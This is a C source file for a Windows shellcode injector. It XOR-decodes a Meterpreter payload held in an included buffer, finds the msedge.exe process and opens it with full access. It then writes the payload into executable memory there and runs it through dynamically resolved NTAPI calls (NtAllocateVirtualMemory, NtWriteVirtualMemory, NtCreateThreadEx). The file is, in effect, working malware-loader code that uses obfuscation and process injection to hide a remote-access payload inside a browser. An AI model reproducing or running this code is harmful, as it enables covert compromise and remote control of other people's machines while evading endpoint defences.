#include <windows.h>
#include <winternl.h> 
#include <stdlib.h>
#include <stdio.h>
#include <wchar.h>
#include "buffer.h" // Buffer containing the XORed Meterpreter payload

// Define success and error codes
#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif

#ifndef STATUS_INFO_LENGTH_MISMATCH
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
#endif

// For initializing OBJECT_ATTRIBUTES
#ifndef InitializeObjectAttributes
#define InitializeObjectAttributes( p, n, a, r, s ) { \
	(p)->Length = sizeof( OBJECT_ATTRIBUTES );        \
	(p)->RootDirectory = r;                           \
	(p)->Attributes = a;                              \
	(p)->ObjectName = n;                              \
	(p)->SecurityDescriptor = s;                      \
	(p)->SecurityQualityOfService = NULL;             \
}
#endif

// Function pointers for NTAPI functions
typedef NTSTATUS (NTAPI* pfnNtAllocateVirtualMemory)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS (NTAPI* pfnNtWriteVirtualMemory)(HANDLE, PVOID, PVOID, ULONG, PULONG);
typedef NTSTATUS (NTAPI* pfnNtOpenProcess)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, CLIENT_ID*);
typedef NTSTATUS (NTAPI* pfnNtClose)(HANDLE);
typedef NTSTATUS (NTAPI* pfnNtCreateThreadEx)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
typedef NTSTATUS (NTAPI* pfnNtQuerySystemInformation)(SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG);

// Declare global pointers to functions
pfnNtAllocateVirtualMemory pNtAllocateVirtualMemory = NULL;
pfnNtWriteVirtualMemory pNtWriteVirtualMemory = NULL;
pfnNtOpenProcess pNtOpenProcess = NULL;
pfnNtClose pNtClose = NULL;
pfnNtCreateThreadEx pNtCreateThreadEx = NULL;
pfnNtQuerySystemInformation pNtQuerySystemInformation = NULL;

// Function to dynamically load NTAPIs
void LoadAPIs() {
    HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");

    pNtAllocateVirtualMemory = (pfnNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
    pNtWriteVirtualMemory = (pfnNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
    pNtOpenProcess = (pfnNtOpenProcess)GetProcAddress(hNtdll, "NtOpenProcess");
    pNtClose = (pfnNtClose)GetProcAddress(hNtdll, "NtClose");
    pNtCreateThreadEx = (pfnNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");
    pNtQuerySystemInformation = (pfnNtQuerySystemInformation)GetProcAddress(hNtdll, "NtQuerySystemInformation");
}

/* 
 * This function performs an XOR encryption/decryption on the input data.
 *
 * @param data: Pointer to the data to be encrypted/decrypted
 * @param data_len: Length of the data
 *
 * The function XORs each byte of the input data with a fixed key (0xAA).
 * This is a simple and symmetric encryption method, meaning the same 
 * function can be used for both encryption and decryption.
 */
void XOR(unsigned char* data, size_t data_len) {
    for (int i = 0; i < data_len; i++) {
        data[i] = data[i] ^ 0xAA;
    }
}

/*
 * This function finds the process ID (PID) of a target process by its name.
 *
 * @param target_process: Name of the target process (Unicode string)
 * 
 * @return process ID of the target process if found, otherwise 0.
 *
 * The function takes a snapshot of all processes in the system and then
 * iterates through them to find a process that matches the given name.
 * If a matching process is found, its process ID is returned.
 */
int FindTarget(const wchar_t* target_process) {

    PVOID buffer = NULL;
    ULONG buffer_size = 0x10000;
    ULONG needed_size = 0;

    buffer = malloc(buffer_size);
    if (!buffer) {
        return 1;
    }

    NTSTATUS status;
    // Reallocate buffer as needed
    while ((status = pNtQuerySystemInformation(SystemProcessInformation, buffer, buffer_size, &needed_size)) == STATUS_INFO_LENGTH_MISMATCH) {
        buffer_size = needed_size;
        buffer = realloc(buffer, buffer_size);
    }

    if (!NT_SUCCESS(status)) {
        free(buffer);
        return 0;
    }

    PSYSTEM_PROCESS_INFORMATION spi = (PSYSTEM_PROCESS_INFORMATION)buffer;
    int pid = 0;

    do {
		if (spi->ImageName.Buffer && wcscmp(spi->ImageName.Buffer, target_process) == 0) {
			pid = (int)spi->UniqueProcessId;
			break;
		}
		spi = (SYSTEM_PROCESS_INFORMATION*)((char*)spi + spi->NextEntryOffset);
	} while (spi->NextEntryOffset != 0);

	free(buffer);
	return pid;

}

/*
 * This function injects a given payload into a target process.
 *
 * @param hProc: Handle to the target process
 * @param buf: Pointer to the buffer containing the code to be injected
 * @param buf_len: Length of the buffer
 *
 * @return 0 if the injection is successful, otherwise -1.
 *
 * The function allocates memory in the target process for the code,
 * writes the code to this allocated memory, and then creates a remote
 * thread in the target process to execute the injected code.
 */
int Inject(HANDLE hProc, unsigned char* buf, unsigned int buf_len) {

    PVOID pRemoteCode = NULL;
    SIZE_T ulSize = buf_len;
    NTSTATUS status;

    status = pNtAllocateVirtualMemory(hProc, &pRemoteCode, 0, &ulSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!NT_SUCCESS(status)) return -1;

    ULONG bytesWritten;
    status = pNtWriteVirtualMemory(hProc, pRemoteCode, buf, buf_len, &bytesWritten);
    if (!NT_SUCCESS(status) || bytesWritten != buf_len) return -1;

    HANDLE hThread = NULL;
    status = pNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProc, pRemoteCode, NULL, FALSE, 0, 0, 0, NULL);    
    if (!NT_SUCCESS(status) || hThread == NULL) return -1;

    WaitForSingleObject(hThread, INFINITE);
    pNtClose(hThread);

    return 0;
}

/*
 * The entry point for the application. This function contains the main code for the shellcode injection.
 */
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {

    const wchar_t* target_process = L"msedge.exe";

    int pid = 0;

    // Setup for calling NtOpenProcess
    HANDLE hProc;
    OBJECT_ATTRIBUTES object_attributes;
    CLIENT_ID clientId;

    LoadAPIs();
    // Check initialization
    if (!pNtAllocateVirtualMemory || !pNtWriteVirtualMemory || !pNtOpenProcess || !pNtClose || !pNtCreateThreadEx || !pNtQuerySystemInformation) return -1; 

    pid = FindTarget(target_process);

    if (pid == 0) {
        wprintf(L"failed to find %s process\n", target_process);
        return 0;
    }

    clientId.UniqueProcess = (HANDLE)pid;
    clientId.UniqueThread = 0;

    InitializeObjectAttributes(&object_attributes, NULL, 0, NULL, NULL);

    NTSTATUS status = pNtOpenProcess(&hProc, PROCESS_ALL_ACCESS, &object_attributes, &clientId);

    if (status == STATUS_SUCCESS) {
        XOR(buf, sizeof(buf));
        Inject(hProc, buf, sizeof(buf));
        pNtClose(hProc);
    }

    return 0;
}
